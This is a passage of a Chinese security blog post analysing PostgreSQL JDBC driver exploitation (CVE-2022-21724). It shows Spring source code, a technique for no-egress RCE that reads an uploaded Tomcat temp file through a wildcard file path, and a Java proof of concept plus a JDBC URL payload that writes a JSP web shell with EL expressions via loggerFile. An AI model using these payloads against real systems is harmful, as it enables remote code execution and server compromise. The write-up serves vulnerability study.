+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Resource[] getResources(String locationPattern) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    Assert.notNull(locationPattern, <span class="string">&quot;Location pattern must not be null&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 处理 classpath*: 前缀的类路径资源</span></span><br><span class="line">    <span class="keyword">if</span> (locationPattern.startsWith(<span class="string">&quot;classpath*:&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">pattern</span> <span class="operator">=</span> locationPattern.substring(<span class="string">&quot;classpath*:&quot;</span>.length());</span><br><span class="line">        <span class="comment">// 判断是否为通配符模式（含有*或?）</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getPathMatcher().isPattern(pattern) </span><br><span class="line">            ? <span class="built_in">this</span>.findPathMatchingResources(locationPattern) <span class="comment">// 通配符匹配</span></span><br><span class="line">            : <span class="built_in">this</span>.findAllClassPathResources(pattern);        <span class="comment">// 普通类路径加载</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// 处理其他协议（如http/file/war等）</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 确定协议前缀结束位置（如war:file:...*/ 或 http://）</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">prefixEnd</span> <span class="operator">=</span> locationPattern.startsWith(<span class="string">&quot;war:&quot;</span>) </span><br><span class="line">            ? locationPattern.indexOf(<span class="string">&quot;*/&quot;</span>) + <span class="number">1</span> </span><br><span class="line">            : locationPattern.indexOf(<span class="string">&#x27;:&#x27;</span>) + <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 判断路径是否包含通配符</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getPathMatcher().isPattern(locationPattern.substring(prefixEnd)) </span><br><span class="line">            ? <span class="built_in">this</span>.findPathMatchingResources(locationPattern) <span class="comment">// 模式匹配加载</span></span><br><span class="line">            : <span class="keyword">new</span> <span class="title class_">Resource</span>[]&#123;<span class="built_in">this</span>.getResourceLoader().getResource(locationPattern)&#125;; <span class="comment">// 直接加载单资源</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>没错，isPattern方法会去尝试通配符匹配。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isPattern</span><span class="params">(<span class="meta">@Nullable</span> String path)</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (path == <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="type">boolean</span> <span class="variable">uriVar</span> <span class="operator">=</span> <span class="literal">false</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; path.length(); ++i) &#123;  </span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> path.charAt(i);  </span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;*&#x27;</span> || c == <span class="string">&#x27;?&#x27;</span>) &#123;  </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;&#123;&#x27;</span>) &#123;  </span><br><span class="line">                uriVar = <span class="literal">true</span>;  </span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;&#125;&#x27;</span> &amp;&amp; uriVar) &#123;  </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们指定xml文件的时候，可以使用file协议制定，此时就需要上传一个文件了，而Tomcat在接收到一个multipart&#x2F;form-data的数据包请求时，会将每个multipart块依次保存在临时目录下。当然，这个过程很快就会删除，</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250528154530433.png"></p>
+<p>可以看到发送上传数据包，<code>upload_3088cfbb_b656_4560_97da_73a9a079c0c3_00000002.tmp</code>文件被创建，随后由立刻删除。</p>
+<p>此时如果我们将原本是挂载到服务器的evil.xml通过这种方式上传，然后用file协议读取，是不是就可以无需出网RCE了。记住不要用调试启动服务，不然读取的时候，文件已经被删除了。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250528161319512.png"></p>
+<p>这个文件名很复杂，不过上述提到的通配符很好的解决了这个问题，我们只需要读取<code>C:/*/asus/AppData/Local/Temp/tomcat*/**/*.tmp</code>即可，<code>tomcat*</code>是匹配<code>tomcat.8080.203470300903884056</code>，<code>**</code>匹配<code>work\Tomcat\localhost\ROOT</code></p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250528161543167.png"></p>
+<p>关于poc的优化，也就是更通用的poc，我左思右想还是决定直接贴上p牛的原文了，毕竟关于这个点的理解还是不够深入。</p>
+<blockquote>
+<p>上面这个请求还有些不完美，对于不同方式启动的Tomcat，这个临时文件的位置不尽相同。阅读Tomcat代码我们可以发现，这个临时文件所在的位置应该位于Tomcat安装目录下的work目录下。</p>
+<p>但对于单文件Springboot来说，此时Tomcat是嵌入式的并不存在安装目录，所以此时临时文件将会存储在系统临时目录下的一个子目录中的work目录下，比如上面图中的</p>
+<p><code>C:\Users\anywhere\AppData\Local\Temp\tomcat.8080.6671401320415070416</code>。</p>
+<p>那么我们是否可以写出一个适配所有环境的Payload？</p>
+<p>还记得前面说的<code>setConfigLocations()</code>函数吗，传入ClassPathXmlApplicationContext的URL将会渲染一次环境变量，<code>$&#123;catalina.home&#125;</code>这个环境变量就指向Tomcat的安装目录，直接使用这个变量就可以避免环境差异导致的问题：</p>
+</blockquote>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250528162748151.png"></p>
+<h2 id="任意文件写入-loggerLevel-loggerFile"><a href="#任意文件写入-loggerLevel-loggerFile" class="headerlink" title="任意文件写入 loggerLevel&amp;loggerFile"></a>任意文件写入 loggerLevel&amp;loggerFile</h2><p>任意文件写入吧，能指定文件名，然后会生成该文件，将日志信息保存进去，能控制的内容比较有限。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;  </span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;  </span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDBC_ATTACK_Locate</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">loggerLevel</span> <span class="operator">=</span> <span class="string">&quot;debug&quot;</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">loggerFile</span> <span class="operator">=</span> <span class="string">&quot;test.txt&quot;</span>;  </span><br><span class="line">        String shellContent=<span class="string">&quot;cmisl&quot;</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jdbcUrl</span> <span class="operator">=</span> <span class="string">&quot;jdbc:postgresql://127.0.0.1:5432/test?loggerLevel=&quot;</span>+loggerLevel+<span class="string">&quot;&amp;loggerFile=&quot;</span>+loggerFile+ <span class="string">&quot;&amp;&quot;</span>+shellContent;  </span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(jdbcUrl);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250528174911128.png"></p>
+<p>tomcat的话考虑写jsp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:$&#123;&quot;&quot;[param.a]()[param.b](param.c)[param.d]()[param.e](param.f)[param.g](param.h)&#125;?loggerLevel=TRACE&amp;loggerFile=/tomcat/.../a.jsp</span><br></pre></td></tr></table></figure>
+
+<p>el表达式不受脏数据影响</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250604183235504.png"></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11258">PostgresQL JDBC Drive 任意代码执行漏洞(CVE-2022-21724)-先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/GS86e2azoF5AdvGYQPk-7g">Java利用无外网（下）：ClassPathXmlApplicationContext的不出网利用</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CsocketFactory-socketFactoryArg"><span class="toc-number">3.</span> <span class="toc-text">远程命令执行socketFactory&amp;socketFactoryArg</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ClassPathXmlApplicationContext"><span class="toc-number">3.1.</span> <span class="toc-text">ClassPathXmlApplicationContext</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5-loggerLevel-loggerFile"><span class="toc-number">4.</span> <span class="toc-text">任意文件写入 loggerLevel&amp;loggerFile</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number"></span> <span class="toc-text">参考文章</span></a>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/08/18/PostgreSQL%20JDBC%20RCE%20&amp;&amp;%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/08/18/PostgreSQL%20JDBC%20RCE%20&amp;&amp;%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/&text=PostgreSQL JDBC RCE &amp;&amp;不出网利用"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/08/18/PostgreSQL%20JDBC%20RCE%20&amp;&amp;%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/&title=PostgreSQL JDBC RCE &amp;&amp;不出网利用"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/08/18/PostgreSQL%20JDBC%20RCE%20&amp;&amp;%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/&is_video=false&description=PostgreSQL JDBC RCE &amp;&amp;不出网利用"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PostgreSQL JDBC RCE &amp;&amp;不出网利用&body=Check out this article: http://example.com/2025/08/18/PostgreSQL%20JDBC%20RCE%20&amp;&amp;%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/08/18/PostgreSQL%20JDBC%20RCE%20&amp;&amp;%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/&title=PostgreSQL JDBC RCE &amp;&amp;不出网利用"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/08/18/PostgreSQL%20JDBC%20RCE%20&amp;&amp;%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/&title=PostgreSQL JDBC RCE &amp;&amp;不出网利用"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/08/18/PostgreSQL%20JDBC%20RCE%20&amp;&amp;%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/&title=PostgreSQL JDBC RCE &amp;&amp;不出网利用"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/08/18/PostgreSQL%20JDBC%20RCE%20&amp;&amp;%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/&title=PostgreSQL JDBC RCE &amp;&amp;不出网利用"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/08/18/PostgreSQL%20JDBC%20RCE%20&amp;&amp;%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/&name=PostgreSQL JDBC RCE &amp;&amp;不出网利用&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/08/18/PostgreSQL%20JDBC%20RCE%20&amp;&amp;%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/&t=PostgreSQL JDBC RCE &amp;&amp;不出网利用"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2016-2025
+        John Doe
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">首页</a></li><!--
+        --><!--
+          --><li><a href="/about/">关于</a></li><!--
+        --><!--
+          --><li><a href="/archives/">归档</a></li><!--
+        --><!--
+          --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
+        -->
+          </ul>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+      
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
